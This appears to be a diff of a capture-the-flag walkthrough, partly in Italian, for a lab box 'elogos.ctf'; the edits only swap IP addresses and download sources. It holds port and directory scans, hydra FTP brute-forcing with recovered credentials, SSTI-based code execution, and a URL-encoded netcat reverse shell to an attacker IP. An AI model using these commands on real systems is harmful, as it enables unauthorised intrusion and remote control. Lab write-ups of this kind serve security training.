@@ -1,13 +1,13 @@
 ### **PORT SCANNING**
 ```bash
-nmap -sT -T5 -p- 192.168.86.129
+nmap -sT -T5 -p- 192.168.5.129
 ```
 ![[Pasted image 20231011153211.png]]
 
 ### **PATH 1 - FTP**
 Directory enumeration
 ```bash
-gobuster dir -e -u "https://192.168.86.129" -w /usr/share/wordlists/dirb/common.txt -k
+gobuster dir -e -u "https://192.168.5.129" -w /usr/share/wordlists/dirb/common.txt -k
 ```
 
 Go to http://elogos.ctf/about-us and take note of the listed username (email)
@@ -15,7 +15,7 @@ Go to http://elogos.ctf/about-us and take note of the listed username (email)
 
 After that launch a brute force with hydra on ftp to gain access
 ```
-hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.5.129
 ```
 ==Creds = j.brock:princess==
 ls -la and take the private ssh key. Crack it.
@@ -29,7 +29,7 @@ Log in as j.brock via ssh
 
 Directory enumeration
 ```bash
-gobuster dir -e -u "https://192.168.86.129" -w /usr/share/wordlists/dirb/common.txt -k
+gobuster dir -e -u "https://192.168.5.129" -w /usr/share/wordlists/dirb/common.txt -k
 ```
 
 
@@ -57,7 +57,7 @@ Use the "user=" parameter to inject the ssti payload and achieve a RCE
 ```
 Usa la reverse shell url encodata
 ```bash
-rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.86.130%204444%20%3E%2Ftmp%2Ff
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.5.128%204444%20%3E%2Ftmp%2Ff
 ```
 ![[Pasted image 20231011155050.png]]
 Now use the rce to obtain a reverse shell
@@ -123,7 +123,7 @@ Entra su ssh come j.brock
 ### **j.brock to m.hack**
 Scarica linpeas ed avvialo
 ```bash
-wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
+wget http://192.168.5.128/linpeas.sh
 ```
 
 ![[Pasted image 20231012165416.png]]
@@ -206,12 +206,12 @@ vim log_alert.conf
 ```
 ![[Pasted image 20231012171555.png]]
 ```bash
-wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+wget http://192.168.5.128/pspy64
 ```
 Aspetta il restart tramite cronjob (ogni minuto)
 tenta di bruteforzare ftp per triggerare fail2ban
 ```bash
-hydra -L /usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.86.129
+hydra -L /usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.5.129
 ```
 ![[Pasted image 20231012172132.png]]
 ![[Pasted image 20231012172158.png]]
